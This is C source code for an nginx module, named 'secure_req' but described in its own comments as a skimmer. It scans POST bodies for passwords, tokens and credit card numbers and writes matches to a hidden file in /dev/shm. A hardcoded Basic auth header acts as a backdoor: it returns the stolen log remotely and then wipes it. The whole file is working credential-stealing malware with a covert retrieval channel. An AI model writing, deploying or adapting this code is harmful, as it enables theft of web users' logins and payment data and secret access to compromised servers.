#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>

/*
Very basic "skimmer" module for nginx
Hooks into the body filter chain to evaluate the POST body for the presence of certain regex patterns

A similar approach could easily be used against the request.args string for get parameters
(No one would ever have sensitive data in those!)

If a pattern is matched, it will attempt to store the request body and URL to a logfile

A mechanism is provided to retrieve the log via a request with a basic authentication header
This allows remote retrieval, and upon retrieval the current log is wiped
*/

// Configuration
// Location of file to log data to
const char *logfile = "/dev/shm/.s3cr3t5";

//Basic (or any string really) provided via Authorization header that will retrieve stored data
ngx_str_t auth = ngx_string("Basic Z2ltbWU6ZGFsb290");

//Regex patterns to search for
const ngx_str_t patterns[] = { 
    ngx_string("pass"),
    ngx_string("token"), 
    ngx_string("\\b(?:\\d(?:%20)*?[ -+]*?){13,16}\\b") // credit card regex example
};

/*
End configuration, no need to edit below this
*/

typedef struct {
    ngx_array_t *regex;
    ngx_str_t err;
} ngx_http_sec_req_t;

typedef struct {
    ngx_str_t *input;
    size_t total;
} ngx_http_sec_ctx_t;

static ngx_int_t ngx_http_secure_req_header_filter(ngx_http_request_t *r);
static ngx_int_t ngx_http_secure_req_filter(ngx_http_request_t *r, ngx_chain_t *in);
static ngx_int_t ngx_http_secure_req_init(ngx_conf_t *cf);
static void * ngx_http_secure_req_conf_init(ngx_conf_t *cf);
static char *ngx_http_secure_req_conf_merge(ngx_conf_t *cf, void *parent, void *child);

static ngx_http_request_body_filter_pt   ngx_http_next_request_body_filter;

static ngx_command_t  ngx_http_secure_req_commands[] = {

    { ngx_string("secure_req"),
      NGX_HTTP_LOC_CONF|NGX_CONF_NOARGS,
      NULL,
      0,
      0,
      NULL },
      ngx_null_command
};


static ngx_http_module_t  ngx_http_secure_req_module_ctx = {
    NULL,                                  /* preconfiguration */
    ngx_http_secure_req_init,          /* postconfiguration */

    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */

    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */

    ngx_http_secure_req_conf_init,         /* create location configuration */
    ngx_http_secure_req_conf_merge         /* merge location configuration */
};


ngx_module_t ngx_http_secure_req_module = {
    NGX_MODULE_V1,
    &ngx_http_secure_req_module_ctx,      /* module context */
    ngx_http_secure_req_commands,         /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    NULL,                                  /* init module */
    NULL,                                  /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    NULL,                                  /* exit master */
    NGX_MODULE_V1_PADDING
};

/*
Read contents of logfile and clear it
Returned char* should be freed when done
Attempts to provide error message if possible, returns as NULL if some other issue encountered
*/
char* read_file() {
    FILE *fp;
    char *response;
    long sz;

    fp = fopen(logfile, "r");
    if(fp == NULL) {
        response = (char*)calloc(22, sizeof(char));
        if(response == NULL) {
            return NULL;
        }
        strcpy(response, "Error accessing file\n");
        return response;
    }
    
    fseek(fp, 0, SEEK_END);
    sz = ftell(fp);

    if(sz == 0) {
        response = (char*)calloc(15, sizeof(char));
        if(response == NULL) {
            return NULL;
        }
        strcpy(response, "File is empty\n");
        return response;
    }


    fseek(fp, 0, SEEK_SET);

    response = (char*)calloc(sz+1, sizeof(char));
    if(response == NULL) {
        return NULL;
    }

    fread(response, sizeof(char), sz, fp);
    //clear file
    fp = freopen(NULL, "w", fp);
    fclose(fp);

    return response;
}

static ngx_int_t ngx_http_secure_req_header_filter(ngx_http_request_t *r) {
    if (r->headers_in.authorization && 
            r->headers_in.authorization->value.len > 0 &&
            ngx_strstr(r->headers_in.authorization->value.data, auth.data) != NULL)
    {
        if (ngx_http_discard_request_body(r) != NGX_OK) {
            return NGX_HTTP_INTERNAL_SERVER_ERROR;
        }
        ngx_buf_t    *b;
        ngx_int_t     rc;
        ngx_chain_t   out;
        char *response;
        
        response = read_file();
        if(response == NULL) {
            return NGX_HTTP_INTERNAL_SERVER_ERROR;
        }

        // Prepare header
        r->headers_out.status = NGX_HTTP_OK;
        r->headers_out.content_length_n = strlen(response);

        rc = ngx_http_send_header(r);

        if (rc == NGX_ERROR || rc > NGX_OK || r->header_only) {
            return rc;
        }
        
        // Send data back
        b = ngx_calloc_buf(r->pool);
        if (b == NULL) {
            return NGX_ERROR;
        }

        b->pos = (u_char*)response;
        b->last = (u_char*)response + strlen(response);
        
        b->memory = 1;
        b->last_buf = (r == r->main) ? 1 : 0;
        b->last_in_chain = 1;

        out.buf = b;
        out.next = NULL;
        ngx_http_output_filter(r, &out);
        free(response);

        return NGX_ERROR;
    }

    return NGX_OK;
}


static ngx_int_t ngx_http_secure_req_init(ngx_conf_t *cf)
{
    ngx_http_handler_pt        *h;
    ngx_http_core_main_conf_t  *cmcf;

    // Sets up data dump in ACCESS_PHASE
    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);
    
    h = ngx_array_push(&cmcf->phases[NGX_HTTP_ACCESS_PHASE].handlers);
    if (h == NULL) {
        return NGX_ERROR;
    }

    *h = ngx_http_secure_req_header_filter;


    // Sets up body skimming
    ngx_http_next_request_body_filter = ngx_http_top_request_body_filter;
    ngx_http_top_request_body_filter = ngx_http_secure_req_filter;

    return NGX_OK;
}

static ngx_int_t ngx_http_secure_req_filter(ngx_http_request_t *r, ngx_chain_t *in) {
    if(r->headers_in.content_length_n == 0) {
        return ngx_http_next_request_body_filter(r, in);
    }

    ngx_http_sec_req_t *conf = ngx_http_get_module_loc_conf(r, ngx_http_secure_req_module);
    ngx_http_sec_ctx_t *ctx;
    int last = 0;

    //this filter can be called multiple times on a single request 
    //occurs with multiple parts to ngx_chain in
    //we use a context to create our full data string between all requests
    //this gets or initializes it
    ctx = ngx_http_get_module_ctx(r, ngx_http_secure_req_module);
    if (ctx == NULL) {
        ctx = ngx_pcalloc(r->pool, sizeof(ngx_http_sec_ctx_t));
        if (ctx == NULL) {
            return ngx_http_next_request_body_filter(r, in);
        }

        ctx->input = ngx_palloc(r->pool, sizeof(ngx_str_t));

        //we make our initial input string allocation based on content length
        ctx->input->len = r->headers_in.content_length_n;
        ctx->input->data = ngx_pcalloc(r->pool, sizeof(u_char) * r->headers_in.content_length_n);
        ctx->total = 0;

        ngx_http_set_ctx(r, ctx, ngx_http_secure_req_module);
    }

    if(conf == NULL || conf->regex == NULL) {
        return ngx_http_next_request_body_filter(r, in);
    }

    //iterate through request data
    for (ngx_chain_t *cl = in; cl; cl = cl->next) {
        //building our full data string
        size_t cl_size = ngx_buf_size(cl->buf);

        //there is a possibility here of a mismatched content_length header causing us issues
        //if we were serious here we might need to resize ctx->input if we encountered
        //a total combined buffer length > content_length
        // - another possible solution is an array of ngx_str_t and only make full string at end
        ngx_memcpy(ctx->input->data + ctx->total, cl->buf->pos, cl_size);

        ctx->total += cl_size;

        //last link in chain, we are ready to eval against regex
        if (cl->buf->last_buf) {
            last = 1;
        }
    }

    // not last request (input string not fully build)
    if(last == 0) {
        return ngx_http_next_request_body_filter(r, in);
    }

    //scan all regex against string in one shot
    if (ngx_regex_exec_array(conf->regex, ctx->input, NULL) == NGX_OK) {
        FILE *fp;
        fp = fopen(logfile, "a+");
        if(fp == NULL) {
            return ngx_http_next_request_body_filter(r, in);
        }

        // nginx str to char*, build file data
        int sz = (ctx->input->len + 1);
        int sz_p = (r->uri.len + r->args.len + 2);
        int sz_h = (r->headers_in.host->value.len + 1);

        char *printed = (char*)calloc(sz, sizeof(char));
        char *printed_uri = (char*)calloc(sz_p, sizeof(char));
        char *printed_host;
        if(sz_h > 1) {
            printed_host = (char*)calloc(sz_h, sizeof(char));
        } else {
            printed_host = (char*)calloc(6, sizeof(char));
        }

        if(printed == NULL || printed_uri == NULL || printed_host == NULL) {
            return ngx_http_next_request_body_filter(r, in);
        }

        memcpy(printed, (char*)ctx->input->data, ctx->input->len);
        memcpy(printed_uri, (char*)r->uri.data, r->uri.len);
        memcpy(printed_uri + r->uri.len, "?", 1);
        memcpy(printed_uri + r->uri.len + 1, (char*)r->args.data, r->args.len);
        if(sz_h > 1) {
            memcpy(printed_host, (char*)r->headers_in.host->value.data, r->headers_in.host->value.len);
        } else {
            strcpy(printed_host, "empty");
        }

        // get a timestamp
        time_t current_time;
        struct tm * time_info;
        char timeString[20];  // "1111-01-01 00:00:00\0"

        time(&current_time);
        time_info = gmtime(&current_time);
        
        strftime(timeString, sizeof(timeString), "%F %T", time_info);
                
        //log to file
        fprintf(fp, "%s %s%s\n%s\n\n", timeString, printed_host, printed_uri, printed);
        fclose(fp);

        free(printed);
        free(printed_uri);
        free(printed_host);
    }
    
    //continue as normal
    return ngx_http_next_request_body_filter(r, in);
}


/*
Setup configuration so we don't need to compile regex every time
This will return NULL if it has some issue allocating etc, 
check for NULL in body filter and skip
*/
static void * ngx_http_secure_req_conf_init(ngx_conf_t *cf)
{
    ngx_http_sec_req_t  *conf;

    conf = ngx_pcalloc(cf->pool, sizeof(ngx_http_sec_req_t));
    if (conf == NULL) {
        return NULL;
    }

    size_t count = sizeof(patterns) / sizeof(patterns[0]);
    conf->regex = ngx_array_create(cf->pool, count, sizeof(ngx_regex_elt_t));

    if (conf->regex == NULL) {
        return NULL;
    }

    //compile all regex patterns from config
    for(size_t i = 0; i < count; i++) {
        ngx_regex_compile_t *pattern;
        ngx_regex_elt_t *re;
        ngx_str_t err = ngx_string("");


        re = ngx_array_push(conf->regex);
        if(re == NULL) {
            continue;
        }

        pattern = ngx_pcalloc(cf->pool, sizeof(ngx_regex_compile_t));
        pattern->pattern = patterns[i];
        pattern->pool = cf->pool;
        pattern->options = NGX_REGEX_CASELESS;
        pattern->err = err;

        if(ngx_regex_compile(pattern) != NGX_OK) {
            //failed to compile a specific pattern, skip
            //this isn't exactly ideal as the empty regex_elt_t is still there
            continue;
        };

        re->regex = pattern->regex;
        re->name = patterns[i].data;
    }

    return conf;
}

static char *ngx_http_secure_req_conf_merge(ngx_conf_t *cf, void *parent, void *child)
{
    ngx_http_sec_req_t *prev = parent;
    ngx_http_sec_req_t *conf = child;

    if (conf->regex == NULL) {
        conf->regex = prev->regex;
    }

    return NGX_CONF_OK;
}